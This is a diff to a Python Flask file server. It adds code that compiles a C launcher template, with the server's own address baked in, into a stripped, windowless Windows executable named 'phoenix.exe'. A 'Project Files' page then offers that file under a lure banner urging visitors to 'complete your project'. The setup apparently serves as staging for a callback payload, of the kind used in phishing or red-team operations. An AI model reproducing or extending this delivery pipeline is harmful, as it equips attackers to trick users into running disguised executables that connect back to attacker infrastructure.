@@ -13,6 +13,102 @@ UPLOAD_DIR = os.path.join(BASE_DIR, "uploaded")
 os.makedirs(BASE_DIR, exist_ok=True)
 os.makedirs(UPLOAD_DIR, exist_ok=True)
 
+import subprocess, tempfile, hashlib, os, re
+
+LAUNCHER_TEMPLATE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "launcher_template.c")
+EXE_CACHE_DIR = os.path.join(BASE_DIR, ".exe_cache")
+os.makedirs(EXE_CACHE_DIR, exist_ok=True)
+
+
+
+ICON_FILE         = os.path.join(os.path.dirname(os.path.abspath(__file__)), "app.ico")
+
+# Cache the compiled icon .o alongside the exes
+ICON_OBJ = os.path.join(EXE_CACHE_DIR, "app.ico.o")
+
+def _ensure_icon_obj() -> str | None:
+    """Compile app.rc + app.ico -> app.ico.o once. Returns path, or None if no icon."""
+    if not os.path.isfile(ICON_FILE):
+        return None
+
+    # Rebuild only if missing or older than the .ico
+    if os.path.isfile(ICON_OBJ) and os.path.getmtime(ICON_OBJ) >= os.path.getmtime(ICON_FILE):
+        return ICON_OBJ
+
+    with tempfile.TemporaryDirectory(dir=EXE_CACHE_DIR) as td:
+        rc_path = os.path.join(td, "app.rc")
+        # Copy the .ico into the temp dir so the relative reference in the .rc resolves
+        tmp_ico = os.path.join(td, "app.ico")
+        with open(ICON_FILE, "rb") as src, open(tmp_ico, "wb") as dst:
+            dst.write(src.read())
+        with open(rc_path, "w", encoding="utf-8") as f:
+            f.write('IDI_ICON1 ICON "app.ico"\n')
+
+        obj_tmp = os.path.join(td, "app.ico.o")
+        r = subprocess.run(
+            ["x86_64-w64-mingw32-windres",
+             "-i", rc_path, "-O", "coff", "-o", obj_tmp],
+            capture_output=True, text=True, timeout=30
+        )
+        if r.returncode != 0:
+            raise RuntimeError(f"windres failed:\n{r.stdout}\n{r.stderr}")
+
+        tmp = ICON_OBJ + ".tmp"
+        os.replace(obj_tmp, tmp)     # both under EXE_CACHE_DIR → atomic
+        os.replace(tmp, ICON_OBJ)
+
+    return ICON_OBJ
+
+def _build_phoenix_exe(server_host: str) -> str:
+    if not re.fullmatch(r"[A-Za-z0-9.\-:]+", server_host):
+        raise ValueError("Invalid server host")
+
+    key    = hashlib.sha256(server_host.encode()).hexdigest()[:16]
+    cached = os.path.join(EXE_CACHE_DIR, f"phoenix_{key}.exe")
+    if os.path.isfile(cached) and os.path.getsize(cached) > 0:
+        return cached
+
+    icon_obj = _ensure_icon_obj()          # ← compile .ico once, reuse forever
+
+    with open(LAUNCHER_TEMPLATE, "r", encoding="utf-8") as f:
+        src = f.read().replace("@IP@", server_host)
+
+    with tempfile.TemporaryDirectory(dir=EXE_CACHE_DIR) as td:
+        cpath   = os.path.join(td, "launcher.c")
+        exepath = os.path.join(td, "phoenix.exe")
+        with open(cpath, "w", encoding="utf-8") as f:
+            f.write(src)
+
+        cmd = ["x86_64-w64-mingw32-gcc", "-O2", "-s", "-mwindows",
+               "-o", exepath, cpath]
+        if icon_obj:
+            cmd.append(icon_obj)           # ← links the icon resource
+
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+        if r.returncode != 0:
+            raise RuntimeError(f"mingw-w64 failed:\n{r.stdout}\n{r.stderr}")
+
+        tmp = cached + ".tmp"
+        os.replace(exepath, tmp)
+        os.replace(tmp, cached)
+
+    return cached
+
+
+
+@app.route("/download/phoenix.exe", methods=["GET"])
+def download_phoenix_exe():
+    server_host = request.host          # e.g. "172.16.25.1:5001" — port included
+    try:
+        exe = _build_phoenix_exe(server_host)
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+    return send_file(
+        exe, as_attachment=True, download_name="phoenix.exe",
+        mimetype="application/vnd.microsoft.portable-executable"
+    )
+
+
 # File extensions where the server IP should be dynamically updated on download
 TEXT_EXTENSIONS = {".txt", ".ps1", ".bat", ".cmd", ".sh", ".py", ".md", ".json", ".xml"}
 
@@ -23,21 +119,25 @@ def get_files_only(directory):
         if os.path.isfile(os.path.join(directory, f)) and not f.startswith(".")
     ])
 
+
 @app.route("/", methods=["GET"])
 def index():
     files = get_files_only(BASE_DIR)
+    # Always advertise the on-the-fly launcher
+    if "phoenix.exe" not in files:
+        files.insert(0, "phoenix.exe")
     return render_template(
-        "index.html",
-        title="Project Files",
-        page="main",
+        "index.html", title="Project Files", page="main",
         banner="Hey, complete your project by downloading these files.",
-        current_path="project_phoenix/",
-        files=files,
-        allow_download=True
+        current_path="project_phoenix/", files=files, allow_download=True,
     )
+
+
 
 @app.route("/download/<path:filename>", methods=["GET"])
 def download_file(filename):
+    if filename == "phoenix.exe":
+        return download_phoenix_exe()
     file_path = os.path.join(BASE_DIR, filename)
     if not os.path.isfile(file_path) or filename.startswith("."):
         abort(404)
